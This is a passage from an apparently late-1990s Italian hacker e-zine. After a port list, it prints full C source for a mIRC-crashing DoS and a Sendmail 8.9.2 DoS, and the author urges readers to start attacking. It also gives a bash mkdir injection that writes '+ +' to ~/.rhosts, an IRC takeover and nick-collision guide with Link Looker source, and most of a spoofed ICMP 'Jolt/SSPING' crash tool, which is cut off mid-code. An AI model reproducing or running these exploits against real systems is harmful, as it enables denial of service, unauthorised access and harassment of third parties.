infatti basta vedere nel file log per capire da dove siano arrivati quei
collegamenti. E mi raccomando imparatevi meglio l'unix!

Quella che segue e' una lista delle porte che uso di piu', con i rispettivi
servizi affianco.

Porta           Servizio        Cos'e'

7               echo            Qualsiasi cosa scrivi, il server te la ripete

9               discard         Dev/null -- Cosa pensi che sia?

11              systat          Molte informazioni sugli utenti

13              daytime         Ora e data del computer

15              netstat         Tremende info riguardo il server

19              chargen         Ti da tanti caratteri ASCII. Usa ^C per fermarli.

21              ftp             Protocollo di Trasferimento File

23              telnet          Dove tu entri.

25              smpt            Servizio di e-mail

37              time            Ora

39              rlp             Locazione di risorse

43              whois           Info riguardo hosts e networks

53              domain          Nome server

70              gopher          Ricercatore di informazioni

79              finger          Molte info riguardo gli utenti

80              http	        Web server

110             pop             E-mail in arrivo

119             nntp            Porte delle news

443             shttp           Un altro web server

512             biff            Notifica delle e-mail

513             rlogin          Login remota
                who             Remoto who e uptime

514             shell           Comandi remoti, senza l'uso della password!
                syslog          Sistema remoto di logging

520             route           Informazioni riguarda al protocollo router

Nota che in molti casi un host usera' queste assegnazioni
di servizi per queste porte. Ma anche piu' di un servizio
puo' essere simultaneamente assegnato alla stessa porta.
Questo sistema di numerazione e' volontariamente offerto dalla
Internet Engineering Task Force (IETF). Cio' mostra che potete
benissimamente trovare altri servizi associati a quelle porte.

In linux il file contenente le porte si trova in /etc/services

Per la composizione di questo articolo mi sono ispirato alla
guida inglese Mostly Harmless Hacking, visto che la ritengo
una guida interessante e molto semplice da capire.

##############################################################################

                ********************
                - COME FAR ANDARE  -
                - IN CRASH IL mIRC -
                ********************

Allora, inizio dicendo vi che questo prog funziona solo da Linux
se volete portarvelo su Win dovrete usare il winsock.
Il programma exploita l'insieme dei socket di mIrc, con conseguente
crash.
mIrc puo' trattare un insieme di influsso dei dati ma non puo'
trattare stringhe di dati che sono analizzate internamente attraverso mIrc.
Questo programma forzera' il mIrc  ad analizzare i dati in entrata
ed ad indentificarli, il risultato dell'analisi e' piu' grande
della grandezza del buffer delle stringhe , cio' causera' un bel crash!
Questo prog creera' 5 connessioni alla porta del mIrc e
poi mandera' la stringa.

/*  hanson.c - by myn with help from h2o and watcher *thanks*

*/
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>


int x, s, i, p, dport;
/* SET STRING HERE */
char *str =
"9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
*
99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999";
struct sockaddr_in addr, spoofedaddr;
struct hostent *host;


int open_sock(int sock, char *server, int port) {
     struct sockaddr_in blah;
     struct hostent *he;
     bzero((char *)&blah,sizeof(blah));
     blah.sin_family=AF_INET;
     blah.sin_addr.s_addr=inet_addr(server);
     blah.sin_port=htons(port);

    if ((he = gethostbyname(server)) != NULL) {
        bcopy(he->h_addr, (char *)&blah.sin_addr, he->h_length);
    }
    else {
         if ((blah.sin_addr.s_addr = inet_addr(server)) < 0) {
           perror("gethostbyname()");
           return(-3);
         }
    }

        if (connect(sock,(struct sockaddr *)&blah,16)==-1) {
             perror("connect()");
             close(sock);
             return(-4);
        }
        printf("     Connected to [%s:%d].\n",server,port);
        return;
}


void main(int argc, char *argv[]) {
     int t;
     if (argc != 3) {
       printf("hanson.c - myn@efnet\n\n");
       printf("This lil program exploits mIRC's bound sockets, making the client crash\n\n");
       printf("Usage: %s <target> <port>\n",argv[0]);
       exit(0);
     }
     printf("hanson.c - myn@efnet\n\n");
     for (t=0; t<5; t++)
     {
     if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
        perror("socket()");
        exit(-1);
     }
     p = atoi(argv[2]);
     open_sock(s,argv[1],p);

     printf("     Sending string 1ooo times to %s port %i... \n", argv[1], p); 
     for (i=0; i<1000; i++) {
       send(s,str,strlen(str),0x0);
     }
     printf("mmmmb0p.\n");
     }
     close(s);
}

Provatelo a compilare e incominciate ad attaccare, solo cosi' le persone
capiranno che e' meglio passare a Linux, ihihih!

##############################################################################

  	      EExxEExxEExxEExxEExxEExxEExx
	      EE SENDMAIL 8.9.2 EXPLOIT EE
	      EExxEExxEExxEExxEExxEExxEExx

Non so quanti di voi conoscono questo exploit, ma vi informo che e' uscito
a Gennaio, e precisamente sono due i bug trovati. Pero' il programmino
che troverete qui' sotto non e' nient'altro che una versione light
dell'exploit che vi indica se il server ha la patch o no.


/*
against.c - Another Sendmail (and pine ;-) DoS (up to 8.9.2)
(c) 1999 by <marchew@linux.lepszy.od.kobiety.pl>

Usage: ./against existing_user_on_victim_host victim_host
Example: ./against nobody lamers.net

*/

#include <stdio.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
#include <errno.h>
#include <signal.h>
#include <getopt.h>
#include <stdlib.h>
#include <string.h>

#define MAXCONN 5
#define LINES   150000

struct hostent *hp;
struct sockaddr_in s;
int suck,loop,x;

int main(int argc,char* argv[]) {

printf("against.c - another Sendmail DoS (up to 8.9.2)\n");

if (argc-3) {
printf("Usage: %s victim_user victim_host\n",argv[0]);
exit(0);
}

hp=gethostbyname(argv[2]);

if (!hp) {
perror("gethostbyname");
exit(1);
}

fprintf(stderr,"Doing mess: ");

for (;loop<MAXCONN;loop++) if (!(x=fork())) {
FILE* d;
bcopy(hp->h_addr,(void*)&s.sin_addr,hp->h_length);
s.sin_family=hp->h_addrtype;
s.sin_port=htons(25);
if ((suck=socket(AF_INET,SOCK_STREAM,0))<0) perror("socket");
if (connect(suck,(struct sockaddr *)&s,sizeof(s))) perror("connect");
if (!(d=fdopen(suck,"w"))) { perror("fdopen"); exit(0); }

usleep(100000);

fprintf(d,"helo tweety\n");
fprintf(d,"mail from: tweety@polbox.com\n");
fprintf(d,"rcpt to: %s@%s\n",argv[1],argv[2]);
fprintf(d,"data\n");

usleep(100000);

for(loop=0;loop<LINES;loop++) {
if (!(loop%100)) fprintf(stderr,".");
fprintf(d,"To: x\n");
}

fprintf(d,"\n\n\nsomedata\n\n\n");

fprintf(d,".\n");

sleep(1);

fprintf(d,"quit\n");
fflush(d);

sleep(100);
shutdown(suck,2);
close(suck);
exit(0);
}

waitpid(x,&loop,0);

fprintf(stderr,"ok\n");

return 0;
}


Come avrete capito, per sfruttarlo dovrete sapere il nome di un user di
quel server e , ovviamente, l'indirizzo. Io per usarlo ho fatto prima
un finger sulla macchina target per vedere l'elenco degli user, poi,
l'ho avviato. I pratica scrive cio':

dopo aver digitato tutti i comandi come per spedire una e-mail, nel corpo
del messaggio stampa 150000 puntini seguiti da un to x che fanno andare
in overflow il sendmail.

Mi sembra che' sia uscita anche la patch, ma se e' per quello il sysadmin
dovra' essere gia' abbastanza intelligente per installarsi la versione
8.9.2 del sendmail, ihihihih!
        						
##############################################################################

     | |_
     |__ \  ///////////////////////////////
        \ / Buffer Overflow della Bash / \__
         /////////////////////////////  \__ |
                                           \_\

E' stato trovato un bug nella bash shell che permette ad una persona
di creare una directory con 'mkdir' affiancato da un comando. Se una persona
entra per sbaglio in quella directory avviera' a sua insaputa quel comando.
Vediamo la riga da aggiungere dopo mkdir dalla linea di comando:

mkdir "\ `echo -e \ "echo + +> ~\57.rhosts\ " > x; source x; rm -f \x\ ` "

Alcune persone hanno detto che cio' succede solo se la variabile PS1
contiene il flag \w o \W , purtroppo li hanno subito smentiti infatti
di seguito vi riporto come fare per creare un overflow.
Vediamo, diamo un version alla bash:

rush:/tmp> bash --version
GNU bash, version 2.03.0(1)-release (i586-pc-linux-gnu)
Copyright 1998 Free Software Foundation, Inc.

Chiamamo il comando 'bash'

rush:/tmp> bash

Ora abbiamo la bash e facciamo un echo alla variabile $PS1

bash-2.03$ echo $PS1
\s-\v\$

Vediamo se e' presente il file .rhosts

bash-2.03$ cat ~/.rhosts
cat: /export/home/guy/.rhosts: No such file or directory

Non e' presente! Usiamo l'mkdir seguito dal comando di prima:

bash-2.03$ mkdir "\ `echo -e \ "echo + +> ~\57.rhosts\ " > x; source x; rm -f \x\ ` "

usiamo il comand 'cd' seguito da una serie di slash per entrare

bash-2.03$ cd \\\ \ /

Ora facciamo un cat al file .rhosts della directory in cui eravamo prima.

bash-2.03$ cat /export/home/guy/.rhosts\
+ +
sh-2.03$

Per ritrovarci una bella shelluzza da root!
Questo e' un errore di virgolette.  Se guardiamo il comando 'mkdir' che
ho scritto, osserviamo che i backslash non sono evitati - cosi' anche se sono
dentro le "" sono lo stesso valutati.

Prova:

$ ls /export/home/urk/.rh*
ls: /export/home/urk/.rh*: No such file or directory
$ echo $PS1
\$
$ mkdir "\ `echo -e \ "echo + +> ~\57.rhosts\ " > x; source x; rm -f \x\ ` "
$ ls /export/home/urk/.rhosts\
/export/home/urk/.rhosts

Questo bug e' presente solo nelle bash shell precedenti alla 2.0,
infatti nella 2.0 il bug e' stato corretto.
Comunque per tutti quelli che possiedono la bash-1.14.7 qui sotto c'e' la
patch per corregere quel bug.

----------taglia qui-----------
                               
--- parse.y.orig        Thu Apr 22 11:53:01 1999
+++ parse.y     Thu Apr 22 12:56:34 1999
@@ -2729,6 +2729,17 @@
 #else
                getwd (t_string);
 #endif /* EFFICIENT */
+               if (strcspn(t_string, slashify_in_quotes) < strlen(t_string)) {
+                   char t_string2[MAXPATHLEN];
+                   int i, j;
+                   for (i = 0, j = 0 ; t_string[i] && j < MAXPATHLEN - 2 ; i++) {
+                       if (member(t_string[i], slashify_in_quotes))
+                           t_string2[j++] = '\\';
+                       t_string2[j++] = t_string[i];
+                   }
+                   t_string2[j] = '\0';
+                   strcpy(t_string, t_string2);
+               }

                if (c == 'W')
                  {

----------taglia qui-----------

Spero che vi ho comunicato qualcosa che non sapevate, comunque questa
informazione l'ho raccolta su buqtraq e per tutti quelli che vogliono
approfondire i bug della shell bash andranno li'. 

##############################################################################


        IrcWar-IrcWar-IrcWar-IrcWar-IrcWar

            GUIDA ALLA GUERRA SU IRC(1)

        IrcWar-IrcWar-IrcWar-IrcWar-IrcWar

Bene benvenuti nel primo di una lunga serie di articoli riguardo
l'Irc War. Non mi ritengo un maestro dell'Irc, ma se siete particolarmente
inesperti in materia, vi insegnero' parecchia roba.
Sorvolando che sappiate tutti i comandi base di Irc, passiamo al sodo.
Facciamo finta che siete su un canale e che volete l'op.
L'unica cosa che vi servono sono il LinkLooker, dopo vi spiego a cosa serve,
e un po' di culo.
Il link looker e' un prog che vi comunica quali sono i server splittati,
seguendo l'insieme di quelli che vi interessano( Undernet, Ircnet, Dalnet,ecc).
Il culo vi servira' invece a trovare dei server splittati che si collegheranno
agli altri server poco dopo che vi siete collegati.
Hmm, e' un po' frastagliato eh?
Allora, come prima cosa devo spiegarvi cosa significa server splittato.
Un server irc splitta quando si scollega dagli altri server della rete irc
Esempio:
la rete irc e' formata da molti server irc tutti comunicanti tra loro. Quando
uno di questi si sconnette dagli altri avviene lo split. Se tu ti colleghi
sul server dove e' avvenuto lo split, immaginando che in quella parte di server
ci sia solo tu, ottieni l'op su quel canale. Ora pero' ci sarai solo tu sul chan
perche' appunto il server e' disconnesso dagli altri. Quando il server
splittato si colleghera' agli altri, otterrai l'op insieme a tutti quelli
che gia' l'avevano, perche' il server splittato vedra' solo te sul chan.
Ora che hai capito la definizione di 'splittato' spero che avrai intuito
che con questo metodo si possono fare parecchie cosine.
A parte i vari takeover, potreste creare anche una nick collision:
facciamo finta che uno vi sta sul cazzo e non volete sprecare uno smurf
per lui. Connettetevi col suo nick al server splittato: quando il server
splittato si connettera' agli altri verrete killati tutti e due
da irc; pero' mi raccomando non intervenite col vostro client ma fatelo
fare ad un clone, ovvero aprite una seconda connessione per fare cio'.
Esistono due metodi per rintracciare degli split:
Il primo e' andare sul canale &servers, canale che vi dara' informazioni
riguardo tutte le stranezze riscontrate su quel server.
Il secondo e' usare Link Looker. 
Ecco il listato del Link Looker:

---------------inizio----------------

/*=============================================================*\
 * ll.c - link looker                                          *
 * Copyright (C) 1994 by The Software System and lilo          *
 * Written by George Shearer (george@sphinx.biosci.wayne.edu)  *
 * Cleaned up to usability by lilo. :)                         *
 *                                                             *
 * September, 1994 - added help, version info and made the     *
 *                   program so you can actually use it. :)    *
 *                     --lilo                                  *
 *                                                             *
 * October 14, 1994 - cleaned up output flushing so you can    *
 *                    actually watch in something like real    *
 *                    time.  :)  --lilo                        *
 *                                                             *
 * October 28, 1994 - kill -1 will now produce a list of SPLIT *
 *                    servers.           -Doc                  *
 *                                                             *
 * November 4, 1994 - should compile on non-POSIX systems now. *
 *                    use -DHPSUCKS for HP-sUX systems 9.0x    *
 * November 15, 1994 - fixed a small bug in lilo's -h checker  *
\*=============================================================*/

/* This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

/* Compiling examples:

   regular old ANSI/C cc:
   cc -O -s -o ll ll.c

   HP-UX cc:
   cc +O3 -Aa -s -DHPSUCKS -o ll ll.c

   GNU GCC:

   Linux:
     gcc -O2 -fomit-frame-pointer -funroll-loops -m486 -s -Wall -o ll ll.c

   BSD, SunOS 4.1.x, Slowaris 2.x, NeXT:
     gcc -O2 -funroll-loops -s -Wall -o ll ll.c */

#define VERSION "1.06"
#define BUFSIZE	400			/* IRC Server buffer */
#define SERVER	"irc.tin.it"	        /* IRC Server        */
#define PORT	6667			/* IRC Port          */
#define LDELAY	30			/* Loop delay seconds*/
#define TIMEOUT	30			/* connection timeout*/

#define ESTABLISHED	1
#define INPROGRESS	2
#define SPLIT		1

#ifdef HPSUCKS
#define _INCLUDE_HPUX_SOURCE
#define _INCLUDE_XOPEN_SOURCE
#define _INCLUDE_POSIX_SOURCE
#endif

#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pwd.h>

unsigned short int session=0,link_count=0;
char in[BUFSIZE],out_buf[BUFSIZE],hostname[64];
char *ins=in;
char serverhost[81], nick[10], user[10], realname[81], lasttime[81];
time_t ltime;

struct irc_server {
  char *name;
  char *link;
  unsigned short int status;
  time_t time;
  struct irc_server *next;
} *sl1=(struct irc_server *)0,*sl2=(struct irc_server *)0;

void do_ping(char *,char *);
void do_001(char *,char *);
void do_error(char *,char *);
void do_364(char *,char *);
void do_365(char *,char *);

/* prototyping is lame when the function is in the same
   code, lilo outta just move the function before all
   other functions that call it  :-) */
char *stamp(time_t);

struct parsers {
   char *cmd;
   void (*func)(char *,char *);
} parsefuns[] = {
   { "PING", (void (*)())do_ping },
   { "001", (void (*)())do_001 },
   { "364",(void (*)())do_364 },
   { "365", (void (*)())do_365},
   { "ERROR",(void (*)())do_error},
   { (char *)0,(void (*)())0 }
};

struct sockaddr_in server;
int sock=0;

#ifndef sys_errlist
extern char *sys_errlist[];
#endif

#ifndef errno
extern int errno;
#endif

char *
mystrerror(int err) {
  return(sys_errlist[err]);
}

unsigned long int
resolver(char *host) {
  unsigned long int ip=0L;

  if(host && *host && (ip=inet_addr(host))==-1) {
    struct hostent *he;
    int x=0;

    while(!(he=gethostbyname((char *)host)) && x++<3) {
      fprintf(stderr,"."); fflush(stderr);
      sleep(1);
    }
    ip=(x<3) ? *(unsigned long *)he->h_addr_list[0] : 0L;
  }

  return(ip);
}

void
clean_sl2(void) {
  while(sl2) {
    struct irc_server *temp=sl2->next;
    if(sl2->name)
      free(sl2->name);
    if(sl2->link)
      free(sl2->link);
    free(sl2);
    sl2=temp;
  }
  sl2=(struct irc_server *)0;
}

void
exit_program(char *why) {
  fprintf(stderr,"\nExiting program. (%s)\n",why);

  if(sock)
    close(sock);

  while(sl1) {
    struct irc_server *temp=sl1->next;
    if(sl1->name)
      free(sl1->name);
    if(sl1->link)
      free(sl1->link);
    free(sl1);
    sl1=temp;
  }

  clean_sl2();

  if(in)
    free(in);

  exit(0);
}

int mystrccmp(register char *s1,register char *s2) {
   while((((*s1)>='a'&&(*s1)<='z')?(*s1)-32:*s1)==
        (((*s2)>='a'&&(*s2)<='z')?(*s2++)-32:*s2++))
     if(*s1++==0) return 0;
   return (*(unsigned char *)s1-*(unsigned char *)--s2);
}

char *mstrcpy(char **to,char *from) {
  if(from) {
    if((*to=(char *)malloc(strlen(from)+1)))
      strcpy(*to,from);
  }
  else
    *to=(char *)0;
  return(*to);
}

char *digtoken(char **string,char *match) {
  if(string && *string && **string) {
    while(**string && strchr(match,**string))
      (*string)++;
    if(**string) { /* got something */
      char *token=*string;
      if((*string=strpbrk(*string,match))) {
        *(*string)++=(char)0;
        while(**string && strchr(match,**string))
          (*string)++;
      }
      else
        *string = ""; /* must be at the end */
      return(token);
    }
  }
  return((char *)0);
}

void signal_handler(void) {
  exit_program("caught signal");
}

void signal_alarm(void) {
  exit_program("timed out waiting for server interaction.");
}

void
out(void) {
  int length=strlen(out_buf);
  errno=0;
  if(write(sock,out_buf,length)!=length)
    exit_program(mystrerror(errno));
}

void
init_server(void) {
  int length;

  sprintf(out_buf,"USER %s %s %s :%s\nNICK %s\nMODE %s +is", \
    user, user, user, realname, nick, nick);
  length=strlen(out_buf);

  errno=0;

  if(write(sock,out_buf,length)==length) {
    fputs("established\n",stderr);
    session=ESTABLISHED;
    alarm(TIMEOUT);
    sprintf(out_buf,"LINKS\n");
    out();
  }
  else
    exit_program(mystrerror(errno));
}

void
heartbeat(void) {
  strcpy(out_buf,"LINKS\n");
  out();
  signal(SIGALRM,(void (*)())heartbeat);
  alarm(LDELAY);
}

void
do_364(char *from,char *left) {
  struct irc_server *serv;
  char *sv1,*sv2;
  char *nick;

  serv=(struct irc_server *)malloc(sizeof(struct irc_server));
  serv->next=sl2;

  serv->status=0;
  nick=digtoken(&left," ");
  sv1=digtoken(&left," ");
  sv2=digtoken(&left," ");

  mstrcpy(&serv->name,sv1);
  mstrcpy(&serv->link,sv2);
  sl2=serv;
}

int
findserv(struct irc_server *serv,char *name) {
  for(;serv;serv=serv->next)
    if(!mystrccmp(name,serv->name))
      return(1);
  return(0);
}

void
show_split(void) {
  struct irc_server *serv=sl1;

  signal(SIGHUP,(void (*)())show_split);
  for(;serv;serv=serv->next) {
    if(serv->status & SPLIT) {
      printf("%s SPLIT: %s [%s]\n",stamp(serv->time),serv->name,serv->link);
      fflush(stdout);
    }
  }
}

void
do_365(char *from,char *left) {
  struct irc_server *serv=sl1;

  for(;serv;serv=serv->next) {
    if(!findserv(sl2,serv->name)) {
      if(!(serv->status & SPLIT)) {
        serv->time=time(NULL);
        printf("%s SPLIT: %s [%s]\n",stamp(serv->time),serv->name,serv->link);
        fflush(stdout);
        serv->status|=SPLIT;
      }
    }
    else
      if(serv->status & SPLIT) {
        serv->time=time(NULL);
        printf("%s MERGE: %s [%s]\n",stamp(serv->time),serv->name,serv->link);
        fflush(stdout);
        serv->status&=~SPLIT;
      }
  }

  serv=sl2;

  for(;serv;serv=serv->next) {
    if(!findserv(sl1,serv->name)) {
      struct irc_server *serv2;

      serv2=(struct irc_server *)malloc(sizeof(struct irc_server));
      serv2->next=sl1;
      serv2->status=0;
      mstrcpy(&serv2->name,serv->name);
      mstrcpy(&serv2->link,serv->link);
      sl1=serv2;
      serv2->time=time(NULL);
      if(link_count) {
        printf("%s ADDED: %s [%s]\n",stamp(serv2->time),serv->name,serv->link);
        fflush(stdout);
      }
    }
  }

  link_count=1;
  clean_sl2();
}

void
do_ping(char *from,char *left) {
  sprintf(out_buf,"PING :%s\n",hostname);
  out();
}

void
do_001(char *from,char *left) {
  fprintf(stderr,"Logged into server %s as nickname %s\n\n",from,nick);
  fflush(stderr);
  alarm(0);
  signal(SIGALRM,(void (*)())heartbeat);
  alarm(LDELAY);
}

void
do_error(char *from,char *left) {
  fprintf(stderr,"Server error: %s\n",left);
  fflush(stderr);
}

void
parse2(void) {
  char *from,*cmd,*left;

  if(*ins==':') {
    if(!(cmd=strchr(ins,' ')))
      return;
    *cmd++=(char)0;
    from=ins+1;
  }
  else {
    cmd=ins;
    from=(char *)0;
  }
  if((left=strchr(cmd,' '))) {
    int command;
    *left++=(char)0;
    left=(*left==':') ? left+1 : left;
    for(command=0;parsefuns[command].cmd;command++) {
      if(!mystrccmp(parsefuns[command].cmd,cmd)) {
        parsefuns[command].func(from,left);
        break;
      }
    }
  }
}

void
parse(int length) {
  char *s=in;

  *(ins+length)=(char)0;

  for(;;) {
    ins=s;
    while(*s && *s!=(char)13 && *s!=(char)10)
      s++;
    if(*s) {
      while(*s && (*s==(char)13 || *s==(char)10))
        *s++=(char)0;
      parse2();
    }
    else
      break;
  }
  strcpy(in,ins);
  ins=in+(s-ins);
}

void
process_server(void) {
  int x=0;

  for(;;) {
    fd_set rd,wr;
    struct timeval timeout;

    timeout.tv_usec=0; timeout.tv_sec=1;
    FD_ZERO(&rd); FD_ZERO(&wr);

    FD_SET(sock,&rd);
    if(session==INPROGRESS)
      FD_SET(sock,&wr);

    errno=0;

#ifdef HPSUCKS
    select((size_t)FD_SETSIZE,(int *)&rd,(int *)&wr,(int *)0,(session==INPROGRESS)?(const struct timeval *)&timeout:(const struct timeval *)0);
#else
    select(getdtablesize(),(fd_set *)&rd,(fd_set *)&wr,(fd_set *)0,(session==INPROGRESS)?(struct timeval *)&timeout:(struct timeval *)0);
#endif

    if(errno==EINTR)
      continue;

    errno=0;
    if(session==INPROGRESS) {
      if(FD_ISSET(sock,&wr)) {
        init_server();
         continue;
      }
      else {
        if(x++>=TIMEOUT)
          exit_program("connection timed out");
        fprintf(stderr,"."); fflush(stderr);
      }
    }

    if(FD_ISSET(sock,&rd)) {
      int length=read(sock,ins,BUFSIZE-(ins-in));

      if(length<1) {
        if(session!=INPROGRESS) {
          if(!errno) {
            fputs("Connection closed by foreign host.",stderr);
            errno=ENOTCONN;
          }
          else
            fprintf(stderr,"Connection to %s closed.\n",
                   inet_ntoa(server.sin_addr));
          fflush(stderr);
        }
        exit_program(mystrerror(errno));
      }
      if(strpbrk(in,"\x0a\x0d"))
        parse(length);
      else
        ins=(BUFSIZE-((ins+length)-in)<1)?in:ins+length;
    }
  }
}

char *stamp(time_t ltime) {
  strftime(lasttime, 81, "%x %X", localtime(&ltime));
  return (char *) &lasttime;
}

void
main(int argc,char *argv[]) {
  unsigned short int sport=PORT;
  unsigned int loop;
  struct passwd *passent;

  fprintf(stderr, "Link Looker v%s, written and designed by Dr. Delete.\n" \
                  "                   Enhanced by lilo.\n" \
                  "Type '%s -h' or '%s --help' for more information.\n\n",
    VERSION, argv[0], argv[0]);

  for(loop=1; loop<argc; loop++) {
    if(!strcmp("-h", argv[loop]) || !strcmp("--help", argv[loop])) {
        fprintf(stderr,"Format:\n\n" \
        "  %s [-h] [<nick> [<server>[:<port>] ['<real name field>' " \
        "[<username>]]]]\n\n  where:\n\n" \
        "  <nick>            is the nickname to be used (default is userid),\n" \
        "  <server>          is the hostname of the server to be used,\n" \
        "  <port>            is a four digit port number (default is 6667),\n" \
        "  <real name field> is a description of the user (default is gecos info), and\n" \
        "  <username>        is the user account field, used only if identd\n" \
        "                    has not been enabled on the user's system.\n", \
        argv[0]);
      exit(1);
    }
  }

  passent=getpwuid(getuid());

  if(argc>1)
    strncpy(nick,argv[1],9);
  else
    strncpy(nick,passent->pw_name,9);

  if(argc>2) {
    char *port=strchr(argv[2],':');
    sport=(port)?atoi(port+1):sport;
    strncpy(serverhost,argv[2],80);
    if(port)
      serverhost[port-argv[2]]=(char)0;
  }
  else
    strncpy(serverhost,SERVER,80);

  if(argc>3)
    strncpy(realname,argv[3],80);
  else {
    char *comma=strchr(passent->pw_gecos,',');
    strncpy(realname,passent->pw_gecos,80);
    if(comma)
      realname[comma-(passent->pw_gecos)]=(char)0;
  }

  if(argc>4)
    strncpy(user,argv[4],9);
  else
    strncpy(user,passent->pw_name,9);

  signal(SIGPIPE,(void (*)())signal_handler);
  signal(SIGHUP,(void (*)())show_split);
  signal(SIGINT,(void (*)())signal_handler);
  signal(SIGTERM,(void (*)())signal_handler);
  signal(SIGBUS,(void (*)())signal_handler);
  signal(SIGABRT,(void (*)())signal_handler);
  signal(SIGSEGV,(void (*)())signal_handler);
  signal(SIGALRM,(void (*)())signal_alarm);

  errno=0;
  if((sock=socket(AF_INET,SOCK_STREAM,0))>0) {
    server.sin_family=AF_INET;
    server.sin_port=htons(sport);
    fprintf(stderr,"Resolving %s...",serverhost); fflush(stderr);
    if((server.sin_addr.s_addr=resolver(serverhost))) {
      fputs("done\n",stderr);
      fflush(stderr);

      setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
      setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
      setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);

      fcntl(sock,F_SETFL,(fcntl(sock,F_GETFL)|O_NDELAY));

      fprintf(stderr,"Connecting to %s...",inet_ntoa(server.sin_addr));
      fflush(stderr);

      errno=0;
      if(connect(sock,(struct sockaddr *)&server,sizeof(server))) {
        if(errno!=EINPROGRESS && errno!=EWOULDBLOCK)
          exit_program(mystrerror(errno));
        else
          session=INPROGRESS;
      }
      else
        init_server();

      gethostname(hostname,64);
      process_server();
    }
    else
      exit_program("resolve failed");
  }
  else {
    fprintf(stderr,"Failed to allocate an AF_INET socket. (%s)\n", \
      mystrerror(errno));
    fflush(stderr);
  }
}

----------------Fine-----------------

Ecco qui, il funzionamento e' semplice!
Dovrete specificare un irc server, una porta e i vari timeout nel sorgente, 
mentre una volta compilato dovrete specificare solo alcune cose, come il
nick, l'user ecc. Penso che per ora basti, la proxima volta vedremo......

##############################################################################

                       _________________
                      /  ______________/ |||||
                      | |
                      | | SSPING ATTACK
                      | |______________
                      \________________\ |||||


Quanti di voi conosco l'SSPING? Facendo finta che la vostra risposta
sia 'TUTTI', avete presente su cosa si basa? Facendo finta che la
vostra risposta sia 'NO' ora ve lo spiego.
Si tratta di un programma che costruisce un pacchetto frammentato
molto grande e che, una volta preso dal win, lo fa bloccare.
Di tutti i pacchetti che vengono mandati ne bastano pochi per far bloccare
il win95. Io lo provai su un mio amico che aveva il win95: sapete il risultato
qual'e' stato? Che dopo aver mandato quella serie di pacchetti a lui ci usci'
la fatidica schermata blu, comune a molti winzozz. Mi e' stato detto
che funziona solo con win95 ma a volte fa bloccare anche il win98 se
usato ripetutamente. Qui di seguito e' riportato il codice.

#define __BSD_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>

Questi sono gli include che servono per la comunicazione dei socket e per
la trasmissione di pacchetti icmp.


int main(int argc, char **argv)
{
	int s,i;
	char buf[400];
	struct ip *ip = (struct ip *)buf;
	struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
	struct hostent *hp, *hp2;
	struct sockaddr_in dst;
	int offset;
	int on;
	int num = 5;
          /*Se non sono stati specificati tutti gli argomenti stampa il menu*/
	if (argc < 3) {
         printf("Jolt v1.0 ANOTHER windows95(And macOS!) glitch by VallaH\n");
	 printf("\nusage: %s <dstaddr> <saddr> [number]\n",argv[0]);
	 printf("\tdstaddr is the host your attacking\n");
	 printf("\tsaddr is the host your spoofing from\n");
    	 printf("\tNumber is the number of packets to send, 5 is default\n");
	 printf("\nGreets to Bill Gates! How do ya like this one?:-)\n");
	 exit(1);
	}
	if (argc == 4) num = atoi(argv[3]);
            /*Ciclo che va da 1 al numero di volte specificato*/
        for (i=1;i<=num;i++) {
	on=1;
	bzero(buf, sizeof buf);
             /*se il socket e' minore di 0 significa che c'e' stato un errore*/
	if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {
		perror("socket");
		exit(1);
	}
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
		perror("IP_HDRINCL");
		exit(1);
	}
             /*se l'indirizzo ricavato da quello specificato non esiste, esce*/
	if ((hp = gethostbyname(argv[1])) == NULL) {
		if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
			fprintf(stderr, "%s: unknown host\n", argv[1]);
			exit(1);
		}
	} else {
		bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
	}
             /*se l'indirizzo ricavato da quello specificato non esiste, esce*/
	if ((hp2 = gethostbyname(argv[2])) == NULL) {
		if ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {
			fprintf(stderr, "%s: unknown host\n", argv[2]);
			exit(1);
		}
	} else {
		bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
	}
               /*Manda dei paccheti icmp alla vittima utilizzando l'ip spoffato*/
               /*questi pacchetti sono modificati ma costruiti in modo da non */
               /*venir scartati al primo router*/
	printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
	ip->ip_v = 4;
	ip->ip_hl = sizeof *ip >> 2;
	ip->ip_tos = 0;
	ip->ip_len = htons(sizeof buf);
	ip->ip_id = htons(4321);
	ip->ip_off = htons(0);
	ip->ip_ttl = 255;
	ip->ip_p = 1;
	ip->ip_csum = 0;

